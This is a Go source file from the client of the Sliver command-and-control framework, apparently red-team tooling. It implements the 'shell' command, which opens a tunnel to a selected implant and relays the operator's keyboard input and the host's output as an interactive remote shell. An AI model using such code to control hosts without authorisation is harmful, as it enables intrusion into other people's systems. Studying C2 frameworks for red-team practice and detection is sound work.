package command

import (
	"fmt"
	"io"
	"log"
	"os"
	"sliver/client/core"
	sliverpb "sliver/protobuf/sliver"
	gen "sliver/server/generate"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

func shell(ctx *grumble.Context, server *core.SliverServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	noPty := ctx.Flags.Bool("no-pty")
	if ActiveSliver.Sliver.OS == gen.WINDOWS {
		noPty = true // Windows of course doesn't have PTYs
	}

	fmt.Printf(Info + "Opening shell tunnel with sliver ...\n")

	tunnel, err := server.CreateTunnel(ActiveSliver.Sliver.ID, defaultTimeout)
	if err != nil {
		log.Printf(Warn+"%s", err)
		return
	}

	shellReq := &sliverpb.ShellReq{
		SliverID:  ActiveSliver.Sliver.ID,
		EnablePTY: !noPty,
		TunnelID:  tunnel.ID,
	}
	shellReqData, _ := proto.Marshal(shellReq)

	resp := <-server.RPC(&sliverpb.Envelope{
		Type: sliverpb.MsgShellReq,
		Data: shellReqData,
	}, defaultTimeout)
	if resp == nil {
		fmt.Printf(Warn + "Error: Server did not respond to request")
		return
	}
	if resp.Error != "" {
		fmt.Printf(Warn+"Error: %s", resp.Error)
		return
	}

	go func() {
		for data := range tunnel.Recv {
			log.Printf("[write] stdout shell with tunnel id = %d", shellReq.TunnelID)
			os.Stdout.Write(data)
		}
	}()

	readBuf := make([]byte, 128)
	for {
		n, err := os.Stdin.Read(readBuf)
		if err == io.EOF {
			return
		}
		log.Printf("[read] %#v", string(readBuf[:n]))
		log.Printf("[read] stdin tunnel %d", shellReq.TunnelID)
		tunnel.Send(readBuf[:n])
	}
}
